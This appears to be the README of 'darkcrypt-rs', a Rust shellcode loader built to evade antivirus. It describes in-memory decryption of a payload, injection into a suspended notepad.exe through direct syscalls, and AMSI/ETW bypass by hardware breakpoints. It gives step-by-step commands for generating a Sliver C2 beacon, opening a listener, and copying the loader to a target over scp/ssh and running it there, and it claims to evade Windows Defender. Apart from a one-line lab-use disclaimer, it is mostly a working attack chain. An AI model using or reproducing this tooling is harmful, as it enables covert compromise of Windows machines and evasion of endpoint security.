<div align="center">

# darkcrypt-rs

**Rust port of darkcrypt. Direct syscalls, HWBP AMSI/ETW bypass, Win11 24H2. Cross-compiled from Linux via mingw-w64.**

</div>

---

> ⚠️ Authorized lab use only (snapshot VMs, HTB, Vulnlab). You own your use.

## What it does

Reads an AES-256-CBC + HMAC-SHA256 payload from disk, verifies and decrypts it in memory with pure-Rust crypto (no `bcrypt.dll`), spawns a suspended `notepad.exe`, and dispatches the shellcode through a persistent RWX syscall trampoline (Halos Gate). ETW and AMSI are silenced via hardware breakpoints in both the loader and the beacon's host, with a third-APC that re-arms DR0 on `AmsiScanBuffer` inside the running beacon.

Build is `#![no_std]` + `#![no_main]`. No stdout — exit code signals state. **37.8 KB PE, `KERNEL32.dll` as the only import.**

## Build

```bash
sudo pacman -S rustup           # or your distro's equivalent
rustup target add x86_64-pc-windows-gnu
# needs x86_64-w64-mingw32-gcc (already installed if you built darkcrypt C)

./scripts/build.sh              # drops artifacts/darkcrypt-rs.exe
```

IOC gate:

```bash
python3 ../darkcrypt/tools/check_iocs.py artifacts/darkcrypt-rs.exe
# expected: 1 finding (SHA-256 IV constants — RFC-6234, accepted baseline)
```

## Usage

1. Generate a Sliver shellcode:
   ```
   sliver > generate --mtls <c2>:8443 --os windows --arch amd64 --format shellcode \
                     --save /tmp/beacon.bin --shellcode-exitopt 3 --shellcode-entropy 3 --skip-symbols
   ```
2. Forge the payload (reuses darkcrypt C's encoder — same wire format):
   ```bash
   ../darkcrypt/forge.sh /tmp/beacon.bin
   ```
   Writes `aes.encrypted` and prints the fresh keys. Paste them into `AES_KEY` / `MAC_KEY` in `src/main.rs`, then rebuild + re-gate.
3. Open the listener:
   ```
   sliver > mtls -L 0.0.0.0 -l 8443
   ```
4. Deliver + fire:
   ```bash
   scp artifacts/darkcrypt-rs.exe   user@target:C:/Users/user/darkcrypt-rs.exe
   scp aes.encrypted                user@target:C:/Users/user/dc_payload.bin
   ssh user@target 'C:\Users\user\darkcrypt-rs.exe C:\Users\user\dc_payload.bin'
   ```
   Session lands on Sliver in ~1-2 seconds.

## Modes

- `darkcrypt-rs.exe` — benign smoke: 16-byte NOP+RET into notepad. Host not auto-cleaned.
- `darkcrypt-rs.exe <path>` — combined: read + verify + decrypt + inject. Host left running for the operator.

## Exit codes

```
0            PASS
1-8          per-stage failure (peb init / halos init / etw / amsi / syscall smoke / read / decrypt / inject)
0xDEADBEEF   panic
```

## Gotchas

- `notepad.exe` is the only reliable host — `RuntimeBroker.exe` dies in ~5s.
- The 1000 ms `io::sleep` between `ResumeThread` and `finish_amsi` is load-bearing. Never remove it.
- Never export `RUSTFLAGS` when building — it replaces `[target.*].rustflags`. PE link args are in `build.rs` as `cargo:rustc-link-arg=` so they survive; the rest of config.toml doesn't.
- Dev profile must `panic = "abort"` (already set) — else `cargo build` drags in `libgcc_eh`.
- Start every run from a clean snapshot.

## Cross-port

| Build          | Size    | Imports               | IOC | Win11 24H2 Defender |
|----------------|---------|-----------------------|-----|---------------------|
| darkcrypt (C)  | 62 KB   | kernel32, ntdll       | 0   | ✓                   |
| darkcrypt-cs   | 37 KB   | n/a (.NET)            | n/a | ✓                   |
| darkcrypt-rs   | 37.8 KB | KERNEL32 only, 8 names| 1   | ✓                   |
